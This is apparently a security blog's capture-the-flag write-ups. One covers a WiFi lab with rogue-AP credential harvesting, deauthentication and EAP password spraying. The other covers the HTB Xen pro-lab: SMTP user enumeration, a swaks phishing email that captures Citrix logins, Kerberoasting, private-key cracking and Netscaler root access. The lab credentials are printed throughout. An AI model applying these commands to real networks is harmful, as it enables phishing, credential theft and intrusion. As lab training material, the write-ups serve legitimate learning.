EAP_buster.sh located in the current directory (./). The script is likely designed to test or exploit Extensible Authentication Protocol (EAP) configurations on Wi-Fi networks. wifi-global This is the SSID (Wi-Fi network name) of the target network. The script will perform its operations on this specific network. 'GLOBAL\\GlobalAdmin' This represents the identity or username being sent to the network during EAP authentication. The format DOMAIN\\User (e.g., GLOBAL\\GlobalAdmin) suggests the network is part of a corporate domain, and the user identity is tied to this domain. wlan1 This specifies the wireless interface to be used by the script. The interface wlan1 must be in monitor mode or capable of interacting with the target network. Below is how the output of the command looks like\nhowever, we could still identify the EAP method supported from hte database we got earlier\nMGT #\r18. What is Juan\u0026rsquo;s flag on the wifi-corp AP website? #\rTo target a misconfigured client on an MGT network, you can set up a Rogue Access Point (RogueAP) that mimics the legitimate network by using the same ESSID and configuration. This RogueAP should use a self-signed certificate, ideally replicating the details of the legitimate certificate to appear convincing if the client manually checks it. A tool like eaphammer can simplify this process.\npython3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced\npython3 ./eaphammer :\nThis runs the eaphammer script using Python 3. eaphammer is a tool designed to perform attacks on WPA-Enterprise networks, including setting up RogueAPs and credential harvesting.\ni wlan3 :\nSpecifies the wireless interface (wlan3) to be used for creating the RogueAP. Ensure this interface supports monitor mode and packet injection.\n-auth wpa-eap :\nIndicates the type of authentication used by the target network, in this case, WPA-Enterprise (WPA-EAP). This type of network uses protocols like PEAP or EAP-TLS for authentication.\n-essid wifi-corp :\nSets the ESSID (network name) for the RogueAP to wifi-corp, matching the name of the legitimate network. This is essential for deceiving clients into connecting to the RogueAP.\n-creds :\nEnables credential harvesting. The RogueAP will attempt to collect usernames and passwords or authentication tokens when a client connects and tries to authenticate.\n-negotiate balanced :\nThis sets the TLS negotiation strategy for the RogueAP to \u0026ldquo;balanced.\u0026rdquo; It aims to balance security and compatibility when negotiating the TLS handshake with clients. This approach helps to mimic a real access point more convincingly.\nUsing airodump-ng , we can identify the MAC addresses of the clients we want to target for a deauthentication attack. To ensure effectiveness, we execute this attack on both clients simultaneously. Since there are two access points (APs), the attack needs to target both of them. This is because disconnecting a client from one AP might cause it to reconnect to the other, rather than connecting to our Rogue Access Point (RogueAP).\nusing the commands\niwconfig wlan0mon channel 44 aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan0mon -c 64:32:A8:07:6C:40 in another shell airmon-ng start wlan1 iwconfig wlan1mon channel 44 aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan1mon -c 64:32:A8:07:6C:40 After performing a deauth attack on the client with address 64:32:A8:07:6C:40 using two different rogueAPs that we had setup, we were able to get the hash that we can crack t get the password as shown below.\nthe hash will be located in a logs directory under the eaphammer tool, where we can take it and get the hash alone using the syntax cat /root/tools/eaphammer/logs/hostapd-eaphammer.log | grep hashcat | awk '{print $3}' \u0026gt;\u0026gt; hashcat.5500\ncat /root/tools/eaphammer/logs/hostapd-eaphammer.log Reads and outputs the contents of the Eaphammer log file . | grep hashcat Filters the output, keeping only lines that contain the word \u0026ldquo;hashcat\u0026rdquo; (likely lines containing extracted WPA hashes). | awk '{print $3}' Extracts the third column ($3) from each matching line. This column probably contains the actual WPA hash . \u0026gt;\u0026gt; hashcat.5500 Appends (\u0026gt;\u0026gt;) the extracted hashes to a file named hashcat.5500 . If hashcat.5500 does not exist, it is created. after we get the hash, we can now crack it using hashcat as shown below\nroot@WiFiChallengeLab:~/VICTOR/captures# hashcat -a 0 -m 5500 hashcat.5500 ~/rockyou-top100000.txt --force after a while we have our password as shown below.\nGot stuck to access the website will look into it further later on.\n19. What is CONTOSO\\test flag on the wifi-corp AP website? #\rIn this challenge, we already know the username, so we perform a brute force attack using the rockyou wordlist. To achieve this, we utilize a tool called air-hammer . It’s crucial to note that having the domain information is essential for this attack to work effectively. First we shall put our user in a text file and perform the bruteforce attack as shown below.\necho \u0026#39;CONTOSO\\test\u0026#39; \u0026gt; test.user ./air-hammer.py -i wlan3 -e wifi-corp -p ~/rockyou-top100000.txt -u test.user ./air-hammer.py :\nThis runs the air-hammer script, a tool used for performing brute-force attacks on WPA/WPA2 Enterprise networks.\ni wlan3 :\nSpecifies the wireless network interface to be used for the attack. In this case, wlan3 is the interface where the attack will be executed. Ensure this interface supports monitor mode.\ne wifi-corp :\nIndicates the target network\u0026rsquo;s ESSID (Extended Service Set Identifier), which is the name of the Wi-Fi network you\u0026rsquo;re attacking. Here, the target network is wifi-corp.\np ~/rockyou-top100000.txt :\nSpecifies the path to the password list file (wordlist) used for brute-forcing. In this case, it points to rockyou-top100000.txt, a subset of the popular rockyou wordlist containing the top 100,000 most common passwords.\nu test.user :\nProvides the username for the attack. Here, the username is test.user, which is necessary since the attack targets WPA/WPA2 Enterprise networks that rely on usernames and passwords for authentication.\nwith the password we have found we can now create a config file that we can use to connect to the network in order for us to access the webpage and get our flag.\nHere is the content of the config file\nnetwork={ ssid=\u0026#34;wifi-corp\u0026#34; scan_ssid=1 key_mgmt=WPA-EAP identity=\u0026#34;CONTOSO\\test\u0026#34; password=\u0026#34;PASSWORD\u0026#34; eap=PEAP phase1=\u0026#34;peaplabel=0\u0026#34; phase2=\u0026#34;auth=MSCHAPV2\u0026#34; } with that we are now provided with an IP address as shown below.\nafter accessing the webpage, I used the password and username of test to be able to get the flag.\n20. What is the flag for the user with pass 12345678 on the wifi-corp AP? #\rThis challenge is similar to the previous one, however for this one we shall perform a password spray attack in order to get the user and get our flag. First we will have to customize our word-list as shown below then perform the password spray attack.\ncat ~/top-usernames-shortlist.txt | awk \u0026#39;{print \u0026#34;CONTOSO\\\\\u0026#34; $1}\u0026#39; \u0026gt; ~/top-usernames-shortlist-contoso.txt and now we shall perform the password spray attack\n./air-hammer.py -i wlan4 -e wifi-corp -P 12345678 -u ~/top-usernames-shortlist-contoso.txt\nwe found our user as shown below.\nthen edited our previous config file to use to access the website and we got our flag after logging to the website with the user’s credentials\n","date":"6 January 2025","externalUrl":null,"permalink":"/posts/wifi-hacking/","section":"Posts","summary":"Wireless Fidelity","title":"WIFI HaCKING","type":"posts"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/categories/ad/","section":"Categories","summary":"","title":"AD","type":"categories"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/tags/htb/","section":"Tags","summary":"","title":"HTB","type":"tags"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/tags/intermediate/","section":"Tags","summary":"","title":"Intermediate","type":"tags"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/tags/mini-prolab/","section":"Tags","summary":"","title":"Mini-Prolab","type":"tags"},{"content":"","date":"12 October 2024","externalUrl":null,"permalink":"/categories/prolabs/","section":"Categories","summary":"","title":"Prolabs","type":"categories"},{"content":"\rMachine info #\rBy egre55\nHumongous Retail operates a nationwide chain of stores. The company has reacted to several recent skimming incidents by investing heavily in their POS systems. Keen to avoid any further negative publicity, they have engaged the services of a penetration testing company to assess the security of their perimeter and internal infrastructure. Xen is designed to put your skills in enumeration, breakout, lateral movement, and privilege escalation to the test within a small Active Directory environment. The goal is to gain a foothold on the internal network, escalate privileges and ultimately compromise the domain while collecting several flags along the way. Entry Point: 10.13.38.12\nBreach #\rEnumeration #\rWe shall start scanning our IP entry point for services that are currently open as shown below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ nmap -sCV -T4 -p- 10.13.38.12 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-12 07:45 EAT Nmap scan report for 10.13.38.12 Host is up (0.21s latency). Not shown: 65532 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 25/tcp open smtp | smtp-commands: CITRIX, SIZE 20480000, AUTH LOGIN, HELP |_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY | fingerprint-strings: | GenericLines, GetRequest: | 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) | sequence of commands | sequence of commands | Hello: | 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) | EHLO Invalid domain address. | Help: | 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) | DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY | NULL: |_ 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) 80/tcp open http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 |_http-title: Did not follow redirect to https://humongousretail.com/ 443/tcp open ssl/http Microsoft IIS httpd 7.5 |_http-server-header: Microsoft-IIS/7.5 | ssl-cert: Subject: commonName=humongousretail.com | Subject Alternative Name: DNS:humongousretail.com | Not valid before: 2019-03-31T21:05:35 |_Not valid after: 2039-03-31T21:15:35 |_http-title: Did not follow redirect to https://humongousretail.com/ | sslv2: | SSLv2 supported | ciphers: | SSL2_RC4_128_WITH_MD5 |_ SSL2_DES_192_EDE3_CBC_WITH_MD5 |_ssl-date: 2024-10-12T04:49:31+00:00; 0s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port25-TCP:V=7.94SVN%I=7%D=10/12%Time=6709FFB6%P=x86_64-pc-linux-gnu%r( SF:NULL,33,\u0026#34;220\\x20ESMTP\\x20MAIL\\x20Service\\x20ready\\x20\\(EXCHANGE\\.HTB\\.L SF:OCAL\\)\\r\\n\u0026#34;)%r(Hello,55,\u0026#34;220\\x20ESMTP\\x20MAIL\\x20Service\\x20ready\\x20\\( SF:EXCHANGE\\.HTB\\.LOCAL\\)\\r\\n501\\x20EHLO\\x20Invalid\\x20domain\\x20address\\. SF:\\r\\n\u0026#34;)%r(Help,6F,\u0026#34;220\\x20ESMTP\\x20MAIL\\x20Service\\x20ready\\x20\\(EXCHANG SF:E\\.HTB\\.LOCAL\\)\\r\\n211\\x20DATA\\x20HELO\\x20EHLO\\x20MAIL\\x20NOOP\\x20QUIT\\ SF:x20RCPT\\x20RSET\\x20SAML\\x20TURN\\x20VRFY\\r\\n\u0026#34;)%r(GenericLines,6F,\u0026#34;220\\x2 SF:0ESMTP\\x20MAIL\\x20Service\\x20ready\\x20\\(EXCHANGE\\.HTB\\.LOCAL\\)\\r\\n503\\x SF:20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20 SF:commands\\r\\n\u0026#34;)%r(GetRequest,6F,\u0026#34;220\\x20ESMTP\\x20MAIL\\x20Service\\x20read SF:y\\x20\\(EXCHANGE\\.HTB\\.LOCAL\\)\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20comman SF:ds\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 271.81 seconds As seen above we ahve port 25 , 80 and 443 open. Furthermore, from the smtp service, we have a host-name identified EXCHANGE.HTB.LOCAL we will start by visiting the website at port 80 to see how it looks and enumerate it for vulnerabilities and hidden directories.\nAs seen above, when we visit the page 10.13.38.12:80 we are redirected to https://humongousretail.com/ which is on port 443 that we initially discovered when did our nmap scan on the host. I will add the host to our etc/hosts file in order to be able to access the site. The site was at first inaacessible from my machine so I had to change the security.tls.version.min to 1 as it only accepted tls versions of TLS 1.2 below is the guideline I used from chatgpt to change the version.\n2. Modify Firefox\u0026#39;s Security Settings: You can configure Firefox to allow older TLS versions. Here\u0026#39;s how: In the Firefox address bar, type: about:config and press Enter. Accept the warning message about changing advanced settings. Search for the preference security.tls.version.min. Change its value from 3 (which enforces TLS 1.2) to 1 (for TLS 1.0) or 2 (for TLS 1.1). Restart the browser and try accessing the site again. Here is how the site looks like.\nAt the very bottom of the page, there is join the team hyperlink that redirects to a mail client with the following email as the receiver of the email jointheteam@humongousretail.com ,\nnow we have one valid email, next we shall try and perform directory bruteforce to identify hidden directories.\nDirectory bruteforcing #\r┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ gobuster dir -k -u https://humongousretail.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 30 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://humongousretail.com [+] Method: GET [+] Threads: 30 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 158] [--\u0026gt; https://humongousretail.com/images/] /Images (Status: 301) [Size: 158] [--\u0026gt; https://humongousretail.com/Images/] /css (Status: 301) [Size: 155] [--\u0026gt; https://humongousretail.com/css/] /js (Status: 301) [Size: 154] [--\u0026gt; https://humongousretail.com/js/] /remote (Status: 301) [Size: 158] [--\u0026gt; https://humongousretail.com/remote/] /IMAGES (Status: 301) [Size: 158] [--\u0026gt; https://humongousretail.com/IMAGES/] /CSS (Status: 301) [Size: 155] [--\u0026gt; https://humongousretail.com/CSS/] /JS (Status: 301) [Size: 154] [--\u0026gt; https://humongousretail.com/JS/] /jakarta (Status: 401) [Size: 1293] the -k flag is used to ignore ssl certificate verifications, however as seen above, we have two intersting directories identified, /remote and /jakarta\nabove are the two pages that we identified while brute forcing for directories.\nNext after identifying our pages, we can now try to poke around with the smtp service to be able and identify more emails.\nSMTP Service #\rWe shall begin by enumerating the smtp service using smtp-user-enum tool which can easily be downloaded on linux using the command apt install smtp-user-enum\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ smtp-user-enum -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -D humongousretail.com -t 10.13.38.12 -m 50 -M RCPT Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum ) ---------------------------------------------------------- | Scan Information | ---------------------------------------------------------- Mode ..................... RCPT Worker Processes ......... 50 Usernames file ........... /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt Target count ............. 1 Username count ........... 26324 Target TCP port .......... 25 Query timeout ............ 5 secs Target domain ............ humongousretail.com ######## Scan started at Sat Oct 12 09:26:13 2024 ######### 10.13.38.12: it@humongousretail.com exists 10.13.38.12: legal@humongousretail.com exists 10.13.38.12: marketing@humongousretail.com exists 10.13.38.12: sales@humongousretail.com exists 10.13.38.12: SALES@humongousretail.com exists ######## Scan completed at Sat Oct 12 09:37:59 2024 ######### 5 results. 26324 queries in 706 seconds (37.3 queries / sec) zsh: unknown file attribute: From the command above -m flag is used to specify maximum number of processes, -M is used to specify method to use for username guessing, in our case we used to guess for recepients’ emails, -t flag is used to specify our target, -D is used to specify the domain we want to try our enumeration on, -U is used to specify a wordlist for usernames we want to test if they exist.\nAs seen above we have found 5 users, we can try and perform some phishing attacks to get if we can get creds of the users we found.\nCreds phishing #\rIn this section we shall perform a phishing campaign using swaks tool,Swiss Army Knife SMTP, the all-purpose SMTP transaction tester, I will be using one email at a time to test for a user who will click our phishing email link. We shall set up a python server or even use netcat to listen on any interactions with our email nad perfrom a phish attack with swaks as shown below.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ swaks --to sales@humongousretail.com --from it@humongousretail.com --header \u0026#34;Subject: Credentials / Errors\u0026#34; --body \u0026#34;citrix http://10.10.15.13/\u0026#34; --server humongousretail.com === Trying humongousretail.com:25... === Connected to humongousretail.com. \u0026lt;- 220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL) -\u0026gt; EHLO v1c70r \u0026lt;- 250-CITRIX \u0026lt;- 250-SIZE 20480000 \u0026lt;- 250-AUTH LOGIN \u0026lt;- 250 HELP -\u0026gt; MAIL FROM:\u0026lt;it@humongousretail.com\u0026gt; \u0026lt;- 250 OK -\u0026gt; RCPT TO:\u0026lt;sales@humongousretail.com\u0026gt; \u0026lt;- 250 OK -\u0026gt; DATA \u0026lt;- 354 OK, send. -\u0026gt; Date: Sat, 12 Oct 2024 09:52:22 +0300 -\u0026gt; To: sales@humongousretail.com -\u0026gt; From: it@humongousretail.com -\u0026gt; Subject: Credentials / Errors -\u0026gt; Message-Id: \u0026lt;20241012095222.079042@v1c70r\u0026gt; -\u0026gt; X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/ -\u0026gt; -\u0026gt; citrix http://10.10.15.13/ -\u0026gt; -\u0026gt; -\u0026gt; . \u0026lt;- 250 Queued (9.828 seconds) -\u0026gt; QUIT \u0026lt;- 221 goodbye === Connection closed with remote host. Above shows the output when we exxecute swaks --to [sales@humongousretail.com](mailto:sales@humongousretail.com) --from [it@humongousretail.com](mailto:it@humongousretail.com) --header \u0026quot;Subject: Credentials / Errors\u0026quot; --body \u0026quot;citrix [http://10.10.15.13/](http://10.10.15.13/)\u0026quot; --server [humongousretail.com](http://humongousretail.com/)\nbelow shows the output of our listener after we executed the phish attack using the same email three times, as I came to realise the citrix server can only be accessed with one person at a time\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.13.38.12 - - [12/Oct/2024 09:50:21] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) 10.13.38.12 - - [12/Oct/2024 09:50:21] \u0026#34;POST /remote/auth/login.aspx?LoginType=Explicit\u0026amp;user=jmendes\u0026amp;password=VivaBARC3L0N@!!!\u0026amp;domain=HTB.LOCAL HTTP/1.1\u0026#34; 501 - 10.13.38.12 - - [12/Oct/2024 09:51:19] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) 10.13.38.12 - - [12/Oct/2024 09:51:19] \u0026#34;POST /remote/auth/login.aspx?LoginType=Explicit\u0026amp;user=pmorgan\u0026amp;password=Summer1Summer!\u0026amp;domain=HTB.LOCAL HTTP/1.1\u0026#34; 501 - 10.13.38.12 - - [12/Oct/2024 09:52:16] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) 10.13.38.12 - - [12/Oct/2024 09:52:16] \u0026#34;POST /remote/auth/login.aspx?LoginType=Explicit\u0026amp;user=awardel\u0026amp;password=@M3m3ntoM0ri@\u0026amp;domain=HTB.LOCAL HTTP/1.1\u0026#34; 501 - 10.13.38.12 - - [12/Oct/2024 09:52:37] code 501, message Unsupported method (\u0026#39;POST\u0026#39;) jmendes / VivaBARC3L0N@!!! awardel / @M3m3ntoM0ri pmorgan / Summer1Summer! the page /remte required as to citrix to our machine, I downloaded the 64-bit tarball package from here and install with the following commands.\n┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ tar -xf linuxx64-13.10.0.20.tar.gz ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ ls PkgId linuxx64-13.10.0.20.tar.gz pro_labs_V1C70Rn00b.ovpn linuxx64 nls setupwfc ┌──(n00b㉿v1c70r)-[~/HTB Prolabs/XEN] └─$ ./setupwfc Citrix Receiver for Linux 13.10.0 setup. Copyright 1996-2018 Citrix Systems, Inc. All rights reserved. Copyright (c) 1986-1997 RSA Security, Inc. All rights reserved. Citrix, Independent Computing Architecture (ICA), Program Neighborhood, MetaFrame, and MetaFrame XP are registered trademarks and Citrix Receiver, Citrix XenApp, XenDesktop, Citrix Presentation Server, Citrix Access Suite, and SpeedScreen are trademarks of Citrix Systems, Inc. in the United States and other countries. Microsoft, MS, MS-DOS, Outlook, Windows, Windows NT, and BackOffice are either registered trademarks or trademarks of Microsoft Corporation in the United States and other countries. All other Trade Names referred to are the Servicemark, Trademark, or Registered Trademark of the respective manufacturers. User install mode. Select a setup option: 1. Install Citrix Receiver for Linux 13.10.0 2. Remove Citrix Receiver for Linux 13.10.0 3. Quit Citrix Receiver for Linux 13.10.0 setup Enter option number 1-3 [1]: 1 Please enter the directory in which Citrix Receiver for Linux is to be installed. [default /home/n00b/ICAClient/linuxx64] or type \u0026#34;quit\u0026#34; to abandon the installation: The parent directory /home/n00b/ICAClient does not exist. Do you want to create it? [default y]: y You have chosen to install Citrix Receiver for Linux 13.10.0 in /home/n00b/ICAClient/linuxx64. Proceed with installation? [default n]: y Installation proceeding... Checking available disk space ... Disk space available 36231080 K Disk space required 51234 K Continuing ... Creating directory /home/n00b/ICAClient/linuxx64 Core package... Setting file permissions... Integrating with browsers... Integration complete. Do you want GStreamer to use the plugin from this client? [default y]: y USB support cannot be installed by non-root users. Run the installer as root to access this install option. Select a setup option: 1. Install Citrix Receiver for Linux 13.10.0 2. Remove Citrix Receiver for Linux 13.10.0 3. Quit Citrix Receiver for Linux 13.10.0 setup Enter option number 1-3 [3]: 3 Quitting Citrix Receiver for Linux 13.10.0 setup. With that installed, we can go back to our website /remote page and try to use one of the creds we found to login.\nI used pmorgan’s creds to login to the platform.\nand we got our flag when we visited the explorer.\nDeploy #\rAfter going through the workstation, I realized there is no windows defender or antivirus program on this machine, therefoe we can simply get a meterpreter session. It was a Windows 7 box so I gave a shot to local_exploit_suggester module of metasploit. As it suggested, you can easily elevate privileges with always_install_elevated module.\nGhost #\rAt this point, I’ve already owned 3 machines and started mapping the lab.\nArp entries gave me some idea about the other machines.\nMy IP address was 172.16.249.205 (with a NAT address of 10.13.38.15), and the other two Windows 7 machines had IPs of 172.16.249.204 (10.13.38.14) and 172.16.249.203 (10.13.38.13).\nFortunately, both the Citrix server and Domain Controller (DC) were resolved via DNS. The DC\u0026rsquo;s IP address was 172.16.249.200\ncitrix was 172.16.249.201 - 10.13.38.12(our entry point)\nI was left with the Netscaler at 172.16.249.202. Typically, UNIX systems have a TTL (Time to Live) of 64 when responding to pings. Knowing that Netscaler is based on FreeBSD, which also has a TTL of 64, this further supported my assumption.\nKerberoasting #\rAfter spending some time and enumeration I saw some of the users had SPNs.\nImport-Module .\\GetUserSPNs.ps1\nBelow I will try and get the hash using kerberoasting technique.\nImport-Module .\\Invoke-Kerberoast.ps1 Invoke-Kerberoast -OutputFormat Hashcat My first attempts to crack the hash failed. After trying a few wordlists, I tried applying some rule files, and it broke:\nhashcat -a 0 -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/dive.rule --force $krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/CITRIXTEST.HTB.LOCAL~1433*$2c25cd994272360eeee9720fcf70b88e$f42d18b44f7bf2e242285f39370da356c9784f4ec96123b5d47766caebb6f0dae5350b58df4cd2c53c2c6671b7d5d425937656e01670134ee858d21b1515121adb29ba6de2fabab4f3ff139369136d3772e11d34c4979a0b5c3f65ff9648b26621d915352fead31a93e2dd01f92f1d329aef924e5969159cde84b764e4b45d01f162a92b667080983ed636f7a154fe4e63255e3d50b33c0fb8b95f0cd70f1bea102c0affcb89ba987bd5a9316a9c3254c93fabf71e584f5eaa726f3a7922b97b47e2bb16f8fb0bb2e73293d3f664e4e85bd3c6b995d13e5df3a1406a9395f7b02777e27ccd433f0fc0d006740ab92d9c13d6f0e91083b764b233783fbe490de230ec13d1c1ab1c63ecfc0248e4bca5050f7706d17ee827caf8377dc70c9df35cb81901542778f7c56aedd7f6491fb1c4e5f47990b95d2999e8df1e884be2023c0289a00f8a68bb12767f85dd958c2b2ae97cd7a5599503b064d7a5074c4932d443a141421941ba4193c08337dc95632d4e88282a6e789925bd4709e00f91420c18e8b6ac0b1bf6798fa719dd863c52b00631c4eedeb9718710f6c14625dd9b4ed71b7a3c09e7c353d44f215f496f2bab37f220e4f60637d5331360e13dcc216d990d1ae80705a8ec053427ab179b5160cdc1b39a26c4700b69c66fd11b53b6e942d0abf54d96f61eb5715c4f58a1246fa86f4a232f36d6989d783909bc28bfd8b836d6250a9f1a5350046a004a452da54d7c48e73998e0a2b457dac1f5687c70441974a27391bb9e31ea4510de4c32ef76a4287ae4929da9ff77cd1c18df4bee33115f356e2df9cee980e38ee644b4f1b9a7da38df0c9bb37d6c9f9fc4d79f407f8919c6b8d9fcba2779f8b91231a8aca7ae7b82e20341f5e5ac29f601d1e112c082128cd8a7be031b2279460833d4b03c2d4018bd1be0ca7b6578933c9142e653e2a931ab56516de8f1fd66a46f6834aa15aa4e4213265011cf7911325a281694b1f5fe040c13d1cc076efa27657deac7661a0455e86f78d5473b63324a1a10247ace4c64a4f37f17c6c671e9a97d4559a1a432aeea2275d7ea803e255add1daae32105c0337da391486157adb645d2faf0a138f63b0a1d7d739d11cbb53013ababb1cbf8d11c71bc143abf200466288197a6714d76ca0e538c25c8563e00acaa020033e3800d0c46cffc164a7a7bdc7851edcc08971328a59f3830158b9146027ccbe4d41df15f5834eff7dded87c4fd40b9aaf287a0d1a8c06cf71c82981ae6832a04ec30499570fb5842416a3202521095d9f337d7bfb1805ba18b7bd50396:4install! Session..........: hashcat Status...........: Cracked Hash.Type........: Kerberos 5 TGS-REP etype 23 Hash.Target......: $krb5tgs$23$*mturner$HTB.LOCAL$MSSQLSvc/CITRIXTEST....d50396 Time.Started.....: Mon May 13 17:40:49 2019 (6 hours, 49 mins) Time.Estimated...: Tue May 14 00:30:34 2019 (0 secs) Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Mod........: Rules (/usr/share/hashcat/rules/dive.rule) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 348.1 kH/s (14.54ms) @ Accel:8 Loops:4 Thr:64 Vec:8 Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress.........: 8733004800/1421327732110 (0.61%) Rejected.........: 0/8733004800 (0.00%) Restore.Point....: 87552/14344385 (0.61%) Restore.Sub.#1...: Salt:0 Amplifier:37644-37648 Iteration:0-4 Candidates.#1....: temperaas1ture -\u0026gt; hako03 Started: Mon May 13 17:40:36 2019 Stopped: Tue May 14 00:30:36 2019 creds mturner / 4install!\nAlthough we are already system at the three VDESKTOP machines, I start poking at CITRIX. The creds from kerberoast are good, but not enough to give a shell.\nproxychains crackmapexec smb 172.16.249.201 -u mturner -p \u0026#39;4install!\u0026#39; ProxyChains-3.1 (http://proxychains.sf.net) SMB 172.16.249.201 445 CITRIX [*] Windows Server 2008 R2 Standard 7601 Service Pack 1 (name:CITRIX) (domain:htb.local) (signing:False) (SMBv1:True) SMB 172.16.249.201 445 CITRIX [+] htb.local\\mturner:4install! Let’s list the shares on the host:\nC:\\\u0026gt;net view /all \\\\citrix Shared resources at \\\\citrix Share name Type Used as Comment ------------------------------------------------------------------------------- ADMIN$ Disk Remote Admin C$ Disk Default share Citrix$ Disk IPC$ IPC Remote IPC ISOs Disk ISOs-TEST Disk The command completed successfully. on the citrix share, i found a flag.\nC:\\\u0026gt;net use \\\\citrix\\citrix$ /u:mturner 4install! The command completed successfully. C:\\\u0026gt;dir \\\\citrix\\citrix$ Volume in drive \\\\citrix\\citrix$ has no label. Volume Serial Number is 244B-E63F Directory of \\\\citrix\\citrix$ 05/08/2019 06:12 PM \u0026lt;DIR\u0026gt; . 05/08/2019 06:12 PM \u0026lt;DIR\u0026gt; .. 02/12/2019 07:21 PM 997,001 Deploying-XenServer-5.6.pdf 03/31/2019 11:25 AM 20 flag.txt 05/08/2019 06:21 PM 1,486 private.ppk 02/12/2019 07:21 PM 1,747,587 XenServer-5-6-SHG.pdf 4 File(s) 2,746,094 bytes 2 Dir(s) 25,994,129,408 bytes free C:\\\u0026gt;type \\\\citrix\\citrix$\\flag.txt XEN{[REDACTED]} Camouflage #\rAn unprivileged user on the netscaler was not able to drop to shell and it was pretty obvious that this ppk file had to be cracked.\nThis part was frustrating because I couldn’t manage to crack the ppk file for a long time. A keyboard walked wordlist was required.\nClone the repository from here and generate a wordlist based on base chars, keymap and route. https://github.com/hashcat/kwprocessor\n./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route /usr/sbin/putty2john private.ppk \u0026gt; private.ppk.hash john private.ppk.hash --wordlist=/opt/kwprocessor/kw-list-small.txt Password:=-09876567890-=-\nIt can be simply converted to OpenSSH private key,puttygen private.ppk -O private-openssh -o private.rsa\nNow we can ssh. (note that Netscaler’s root user is nsroot)\nproxychains ssh -i ~/id_private_xen.pem nsroot@172.16.249.202 ProxyChains-3.1 (http://proxychains.sf.net) ############################################################################### # # # WARNING: Access to this system is for authorized users only # # Disconnect IMMEDIATELY if you are not an authorized user! # # # ############################################################################### Enter passphrase for key \u0026#39;/root/id_private_xen.pem\u0026#39;: Last login: Wed May 8 23:23:15 2019 from 172.16.249.201 Done \u0026gt; we are still at the netscaler prompt, but this user has access to the shell command\n\u0026gt; shell Copyright (c) 1992-2013 The FreeBSD Project. Copyright (c) 1979, 1980, 1983, 1986, 1988, 1989, 1991, 1992, 1993, 1994 The Regents of the University of California. All rights reserved. root@netscaler# This box isn\u0026rsquo;t finished yet. Now we move on to post-exploitation.\nLet\u0026rsquo;s begin by checking the logs\ncd /var/log gunzip -d *.gz cat * | grep XEN $ /login/do_login?LoginType=Explicit\u0026amp;username=cmeller\u0026amp;password=XEN%7Bbu7_ld4p5_15_4_h455l3%7D ^ When I first tried it was on the logs but second time I tried, it wasn\u0026#39;t there. I noticed from the logs that the netscaler-svc service was constantly interacting with the Citrix server and the Netscaler. Monitoring the traffic seemed like a good next step.\ntcpdump -s 65534 -w out.pcap proxychains scp -i private.rsa nsroot@172.16.249.202:/root/out.pcap . wireshark out.cap we got our flag on packet number 10\nThere was also netscaler-svc’s password in the tcpdump capture too. I actually saw this after I finished the lab\nDoppelgänger #\rAt this point, I had already gathered numerous credentials and gained access to most of the boxes.\nWe shouldn\u0026rsquo;t be too far off, right?\nAs the name Doppelgänger suggests, there might be an account using the same password as one of those we\u0026rsquo;ve already found.\nproxychains xfreerdp 